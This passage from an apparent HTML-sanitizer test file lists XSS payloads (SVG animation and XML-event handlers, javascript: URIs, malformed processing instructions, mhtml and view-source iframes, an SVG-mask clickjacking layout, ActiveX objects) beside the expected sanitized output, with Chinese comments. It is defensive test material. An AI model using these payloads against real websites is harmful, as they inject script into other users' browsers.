      '<div id="79"><object allowscriptaccess="always" data="x"></object>//["\'`-->]]>]</div>',
    'expected': '<div id="79">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * style 元素内使用全角 expression 字样；
   * 期望 CSS 原文留存，记录 DOM 净化不解释 CSS 文本。
   */
  {
    'payload':
      '<div id="80"><style>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}</style>//["\'`-->]]>]</div>',
    'expected':
      '<div id="80"><style>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}</style>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 未知 x 使用 namespace/xlink 属性；
   * 期望载体删除，检查未知标签拒绝。
   */
  {
    'payload':
      '<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["\'`-->]]>]</div>',
    'expected': '<div id="81">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * PI 与前缀 WML timer；
   * 期望指令和未知结构删除，检查默认 HTML 树过滤。
   */
  {
    'payload':
      '<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["\'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["\'`-->]]>]</div>',
    'expected':
      '<div id="82">//["\'`--&gt;]]&gt;]</div><div id="83">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * XML event 属性挂在未知 x 上；
   * 期望载体删除，检查未知元素拒绝。
   */
  {
    'payload':
      '<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["\'`-->]]>]</div>',
    'expected': '<div id="84">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 另一组 XML event 观察器与处理器；
   * 期望相关未知元素删除，检查非默认标签集合。
   */
  {
    'payload':
      '<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["\'`-->]]>]</div>',
    'expected': '<div id="85">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * body oninput、autofocus 与 SVG javascript xlink；
   * 期望事件/危险 URI 删除，检查 HTML 与 SVG 属性组合。
   */
  {
    'payload':
      '<div id="86"><body oninput=alert(86)><input autofocus>//["\'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>\n</svg>//["\'`-->]]>]</div>',
    'expected':
      '<div id="86"><input>//["\'`--&gt;]]&gt;]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink"><rect width="1000" height="1000" fill="white"></rect></a>\n</svg>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * SVG set/animate 尝试写事件属性；
   * 期望动画载体删除，检查危险 SVG 动画标签拒绝。
   */
  {
    'payload':
      '<div id="89"><svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="alert(89)"/>\n<animate attributeName="onunload" to="alert(89)"/>\n</svg>//["\'`-->]]>]</div>',
    'expected':
      '<div id="89"><svg xmlns="http://www.w3.org/2000/svg">\n\n\n</svg>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * style 的 content/background 指向外部 SVG；
   * 期望 URL 文本留存，检查允许 CSS 属性边界，未解析外部资源。
   */
  {
    'payload':
      '<div id="90"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style="background:url(test5.svg)">PRESS ENTER</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="90">\n<div style="content:url(test2.svg)"></div>\n\n\n\n\n<div style="background:url(test5.svg)">PRESS ENTER</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 畸形 PI/声明拼接 script；
   * 期望脚本删除、残余文字保留转义，检查解析器恢复后的结构。
   */
  {
    'payload':
      '<div id="91">[A]\n<? foo="><script>alert(91)</script>">\n<! foo="><script>alert(91)</script>">\n</ foo="><script>alert(91)</script>">\n[B]\n<? foo="><x foo=\'?><script>alert(91)</script>\'>">\n[C]\n<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">\n[D]\n<% foo><x foo="%><script>alert(91)</script>">//["\'`-->]]>]</div>',
    'expected':
      '<div id="91">[A]\n"&gt;\n"&gt;\n"&gt;\n[B]\n"&gt;\n[C]\n\n[D]\n&lt;% foo&gt;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * CSS URL 带空格和畸形分隔；
   * 期望 style 原文留存，检查允许样式属性的字符串返回。
   */
  {
    'payload':
      '<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * list-style CSS 中夹控制字节和 javascript；
   * 期望 CSS 字符串留存，说明普通 URI 属性规则未应用于 CSS 内容。
   */
  {
    'payload':
      '<div id="93"><div style="list-style:url(http://foo.f)\u0010url(javascript:alert(93));">X</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="93"><div style="list-style:url(http://foo.f)\u0010url(javascript:alert(93));">X</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * SVG handler 元素及脚本文字；
   * 候选删除载体、容纳文字及 XML 序列化差异，检查 SVG 名称准入。
   */
  {
    'payload':
      '<div id="94"><svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="94"><svg xmlns="http://www.w3.org/2000/svg">\n\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="94"><svg xmlns="http://www.w3.org/2000/svg">\nalert(94)\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="94"><svg xmlns="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">\n\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG feImage 内 set 指向 data URI；
   * 候选保留 feImage、删除 set，容纳命名空间及空白，检查滤镜与动画标签区别。
   */
  {
    'payload':
      '<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n\n</feImage>\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >\n\n<feImage>\n\n</feImage>\n\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n\n</feImage>\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * iframe 使用 mhtml URI；
   * 期望整棵 iframe 删除，检查默认载体拒绝。
   */
  {
    'payload':
      '<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["\'`-->]]>]</div>',
    'expected': '<div id="96">\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * namespace 属性值夹 iframe 形状并再插 script；
   * 期望活动载体/脚本删除，检查属性文本与真实节点分界。
   */
  {
    'payload':
      "<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>",
    'expected':
      '<div id="97">\n<div id="d"></div>\n\n\n<div id="d"></div>\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * CSS 值含多个控制字节，另有重插入 script；
   * 候选容纳原字节或数字实体序列化，脚本均删除，检查文本/活动标记区分。
   */
  {
    'payload':
      '<div id="98"><div id=d><div style="font-family:\'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="98"><div id="d"><div style="font-family:\'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B\'">X</div></div>\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="98"><div id="d"><div style=\'font-family: "sans&#23;&#2;F&#2;A&#18;&#2;A&#2;F&#3;B color&#3;Ared&#3;B";\'>X</div></div>\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="98"><div id="d"><div style="font-family:\'sans&#23;&#2;F&#2;A&#18;&#2;A&#2;F&#3;B color&#3;Ared&#3;B\'">X</div></div>\n//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * CSS 注释换行跨解析边界；
   * 候选允许 style 保留或删除，记录引擎对畸形样式结构的差异。
   */
  {
    'payload':
      '<div id="99">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="99">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\ned/*)} /* IE 6-7 Standards mode */\n\n</style>//["\'`--&gt;]]&gt;]</div>',
      '<div id="99">XXX//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * img src 内含 script 形状字节；
   * 候选删除或编码/URI 转义该值，不形成活动 script，检查属性序列化差异。
   */
  {
    'payload':
      '<div id="102"><img src="x` `<script>alert(102)</script>"` `>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="102"><img src="x` `&lt;script&gt;alert(102)&lt;/script&gt;">//["\'`--&gt;]]&gt;]</div>',
      '<div id="102"><img src="x` `<script>alert(102)</script>">//["\'`--&gt;]]&gt;]</div>',
      '<div id="102"><img src="x%60%20%60%3Cscript%3Ealert%28102%29%3C/script%3E">//["\'`--&gt;]]&gt;]</div>',
      '<div id="102">//["\'`--&gt;]]&gt;]</div>',
      '<div id="102"><img>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * history 脚本与 XML event 未知节点；
   * 候选删除活动载体并容纳 SVG 输出形状，检查多类结构过滤。
   */
  {
    'payload':
      '<div id="103"><script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>//["\'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="103">//["\'`--&gt;]]&gt;]</div><div id="104"><svg id="foo" xmlns="http://www.w3.org/2000/svg">\n\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="103">//["\'`--&gt;]]&gt;]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo" xmlns="http://www.w3.org/2000/svg">\n\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="103">//["\'`--&gt;]]&gt;]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">\n\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="103">//["\'`--&gt;]]&gt;]</div><div id="104">//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * iframe data URI 带 gzip HTML；
   * 期望 iframe 删除，检查载体拒绝，不解压 URI。
   */
  {
    'payload':
      '<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["\'`-->]]>]</div>',
    'expected': ['<div id="105">//["\'`--&gt;]]&gt;]</div>']
  },
  /**
   * 畸形 img 属性和值边界；
   * 候选为无 src 或空 src 图片，检查解析恢复后的属性过滤。
   */
  {
    'payload':
      '<div id="106"><img src onerror /" \'"= alt=alert(106)//">//["\'`-->]]>]</div>',
    'expected': [
      '<div id="106"><img src="">//["\'`--&gt;]]&gt;]</div>',
      '<div id="106"><img>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * title 的 onpropertychange；
   * 候选删事件，允许 title 保留或被环境裁剪，检查事件属性。
   */
  {
    'payload':
      '<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="107"><title></title><title title=""></title>//["\'`--&gt;]]&gt;]</div>',
      '<div id="107">//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 反引号属性内嵌 img 文字；
   * 候选保留或转义惰性内容，不把它当真实事件，检查属性边界序列化。
   */
  {
    'payload':
      '<div id="108"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">\n<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["\'`-->]]>]</div>',
    'expected': [
      '<div id="108">\n<a href="http://foo.bar/#x=`y"></a><img alt="`&gt;&lt;img src=xx onerror=alert(108)&gt;&lt;/a&gt;">\n\n<img alt="`&gt;&lt;img src=xx onerror=alert(2)//">\n<img alt="`&gt;&lt;img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>',
      '<div id="108">\n<a href="http://foo.bar/#x=`y"></a><img alt="`><img src=xx onerror=alert(108)></a>">\n\n<img alt="`><img src=xx onerror=alert(2)//">\n<img alt="`><img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>',
      '<div id="108">\n<a href="http://foo.bar/#x=%60y"></a><img alt="`&gt;&lt;img src=xx onerror=alert(108)&gt;&lt;/a&gt;">\n\n<img alt="`&gt;&lt;img src=xx onerror=alert(2)//">\n<img alt="`&gt;&lt;img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>',
      '<div id="108">\n<a href="http://foo.bar/#x=`y"></a>\n\n<img alt="`><img src=xx onerror=alert(2)//">\n<img alt="`><img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>',
      '<div id="108">\n<a href="http://foo.bar/#x=`y"></a>\n\n<img alt="`&gt;&lt;img src=xx onerror=alert(2)//">\n<img alt="`&gt;&lt;img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG 图形的 clip/fill/filter/marker/mask/stroke 样式引用；
   * 候选容纳合法属性、CSS 与 XML 序列化，检查表现属性准入。
   */
  {
    'payload':
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"></rect></a>\n<rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"></rect>\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000" /></a>\n<rect style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);" fill="white" />\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000" FILL="white" /></a>\n<rect style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);" fill="white" FILL="white" />\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000" /></a>\n<rect style="filter: url(&quot;#c&quot;); clip-path: url(&quot;test3.svg#a&quot;); fill: url(#b); marker-end: url(&quot;#d&quot;); marker-mid: url(&quot;#d&quot;); marker-start: url(&quot;#d&quot;); mask: url(&quot;#e&quot;); stroke: url(#f);" fill="white" />\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000" /></a>\n<rect style="clip-path: url(&quot;test3.svg#a&quot;); fill: url(#b); marker-end: url(&quot;#d&quot;); marker-mid: url(&quot;#d&quot;); marker-start: url(&quot;#d&quot;); mask: url(&quot;#e&quot;); stroke: url(#f);" fill="white" />\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG path 的 d 与 marker style；
   * 候选允许路径数据规范化及样式序列化，检查路径属性保留。
   */
  {
    'payload':
      '<div id="110"><svg xmlns="http://www.w3.org/2000/svg">\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="110"><svg xmlns="http://www.w3.org/2000/svg">\n<path d="M0,0" style="marker-start:url(test4.svg#a)"></path>\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="110"><svg xmlns="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">\n<path d="M 0 0" style="marker-start: url(&quot;test4.svg#a&quot;);" />\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="110"><svg xmlns="http://www.w3.org/2000/svg">\n<path d="M 0 0" style="marker-start:url(test4.svg#a)" />\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="110"><svg xmlns="http://www.w3.org/2000/svg">\n<path d="M 0 0" style="marker-start: url(&quot;test4.svg#a&quot;);" />\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * div 的畸形 background URL/注释 CSS；
   * 两个候选为原样或规范化 URL 引号，检查样式序列化。
   */
  {
    'payload':
      '<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["\'`--&gt;]]&gt;]</div>',
      '<div id="111"><div style=\'background: url("/f#[a]oo/;color:red/*/foo.jpg");\'>X</div>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 非法 font-family 与后续 style 块并存；
   * 候选允许 div style 保留或移除，style 块原文保留，检查浏览器样式解析差异。
   */
  {
    'payload':
      '<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div><div id="113"><div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["\'`--&gt;]]&gt;]</div><div id="113"><div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//["\'`--&gt;]]&gt;]</div>',
      '<div id="112"><div>X</div>//["\'`--&gt;]]&gt;]</div><div id="113"><div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 未知 x 的 style 与条件注释夹脚本/图片；
   * 期望包装和注释删除、XXX 文字留存，检查标签提升与注释过滤。
   */
  {
    'payload':
      '<div id="114"><x style="background:url(\'x[a];color:red;/*\')">XXX</x>//["\'`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//["\'`-->]]>]</div>',
    'expected':
      '<div id="114">XXX//["\'`--&gt;]]&gt;]</div><div id="115">\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * xml:namespace/import/t:set 声明 innerHTML 插入图片；
   * 期望声明载体删除、普通 x 文本保留，检查 HTML 名称准入。
   */
  {
    'title': 'XML',
    'payload':
      '<div id="116"><div id="x">x</div>\n<xml:namespace prefix="t">\n<import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" targetElement="x" to="<img\u000Bsrc=x\u000Bonerror\u000B=alert(116)>">//["\'`-->]]>]</div>',
    'expected':
      '<div id="116"><div id="x">x</div>\n\n\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 安全 http 链接内嵌 iframe；
   * 期望链接保留、iframe 子树删除，检查允许祖先中的拒绝载体。
   */
  {
    'title': 'iframe',
    'payload':
      '<div id="117"><a href="http://attacker.org">\n    <iframe src="http://example.org/"></iframe>\n</a>//["\'`-->]]>]</div>',
    'expected':
      '<div id="117"><a href="http://attacker.org">\n    \n</a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * draggable div 带 ondragstart，兄弟 iframe；
   * 期望拖拽属性/文字保留、事件与 iframe 删除，检查属性与标签组合。
   */
  {
    'title': 'Drag & drop',
    'payload':
      '<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n    <h1>Drop me</h1>\n</div>\n<iframe src="http://www.example.org/dropHere.html"></iframe>//["\'`-->]]>]</div>',
    'expected':
      '<div id="118"><div draggable="true">\n    <h1>Drop me</h1>\n</div>\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * iframe 的 view-source URI 与布局 style；
   * 期望空 div，检查载体整体拒绝，未单独测试该协议。
   */
  {
    'title': 'view-source',
    'payload':
      '<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>',
    'expected': '<div id="119"></div>'
  },
  /**
   * textarea 只有 type/cols/rows，尾部为不匹配标记文字；
   * 期望属性保留、杂字转义，检查安全表单属性和序列化。
   */
  {
    'payload':
      '<textarea type="text" cols="50" rows="10"></textarea>//["\'`-->]]>]</div>',
    'expected':
      '<textarea type="text" cols="50" rows="10"></textarea>//["\'`--&gt;]]&gt;]'
  },
  /**
   * script 定义 window.open，再由链接 onclick 调用；
   * 期望脚本/onclick 删除、href=# 留存，检查默认事件和脚本过滤。
   */
  {
    'title': 'window.open',
    'payload':
      '<div id="120"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open(\'popup.html\',\'spam\'+i,\'width=50,height=50\');\n    }\n}\n</script>\n<body>\n<a href="#" onclick="makePopups()">Spam</a>//["\'`-->]]>]</div>',
    'expected':
      '<div id="120">\n\n<a href="#">Spam</a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * iframe 与前缀 SVG mask 构造点击覆盖布局；
   * 候选删除载体或保留转义文字，记录 HTML 前缀解析差异，未进行点击交互。
   */
  {
    'payload':
      '<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"\nxmlns:svg="http://www.w3.org/2000/svg">\n<body style="background:gray">\n<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>\n<svg:svg>\n<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">\n    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>\n    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="121">\n\n\n\n\n    \n    \n\n\n\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="121">\n\n\n&lt;svg:svg&gt;\n&lt;svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"&gt;\n    &lt;svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/&gt;\n    &lt;svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/&gt;\n&lt;/svg:mask&gt;\n&lt;/svg:svg&gt;\n&lt;/body&gt;\n&lt;/html&gt;//["\'`--&gt;]]&gt;]&lt;/div&gt;</div>',
      '<div id="121">\n\n</div>'
    ]
  },
  /**
   * iframe 声明 sandbox 仍带多项允许令牌；
   * 期望整个 iframe 删除，检查默认标签策略与 sandbox 内容无关。
   */
  {
    'title': 'iframe (sandboxed)',
    'payload':
      '<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["\'`-->]]>]</div>',
    'expected': '<div id="122">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 安全 span/link 与外部、内联 jQuery 脚本；
   * 候选保留文本/安全属性、删除两种 script，仅容纳属性顺序。
   */
  {
    'payload':
      '<div id="123"><span class=foo>Some text</span>\n<a class=bar href="http://www.example.org">www.example.org</a>\n<script src="http://code.jquery.com/jquery-1.4.4.js"></script>\n<script>\n$("span.foo").click(function() {\nalert(\'foo\');\n$("a.bar").click();\n});\n$("a.bar").click(function() {\nalert(\'bar\');\nlocation="http://html5sec.org";\n});\n</script>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="123"><span class="foo">Some text</span>\n<a href="http://www.example.org" class="bar">www.example.org</a>\n\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="123"><span class="foo">Some text</span>\n<a class="bar" href="http://www.example.org">www.example.org</a>\n\n//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 两个 script src 使用斜杠和转义控制字节；
   * 期望脚本删去、后续浏览器说明文字保留，检查解析后的 script 拒绝。
   */
  {
    'payload':
      '<div id="124"><script src="/example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10\n<script src="\\example.com\foo.js"></script> // Safari 5.0//["\'`-->]]>]</div>',
    'expected':
      '<div id="124"> // Safari 5.0, Chrome 9, 10\n // Safari 5.0//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * XSL PI/doctype/SVG stylesheet 内 iframe；
   * 候选删转换载体、保留 circle 或裁剪 SVG，容纳空白及 XML 自闭合。
   */
  {
    'payload':
      '<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="125">]&gt;<svg xmlns="http://www.w3.org/2000/svg">        <circle fill="red" r="40"></circle></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="125">]&gt;<svg xmlns="http://www.w3.org/2000/svg">                                        <circle fill="red" r="40"></circle></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="125">]&gt;<svg xmlns="http://www.w3.org/2000/svg">        <circle fill="red" r="40" /></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="125">]&gt;<svg xmlns="http://www.w3.org/2000/svg">                                        <circle fill="red" r="40" /></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="125">]&gt;//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * ActiveX object 与 onqt_error/param；
   * 期望两对象整体删除，检查插件载体拒绝。
   */
  {
    'payload':
      '<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["\'`-->]]>]</div>',
    'expected': '<div id="126">\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * SVG listener/handler 使用 XML events；
   * 候选删事件载体，允许 alert 字样作为惰性文本或被丢弃，检查未知 SVG 子节点。
   */
  {
    'payload':
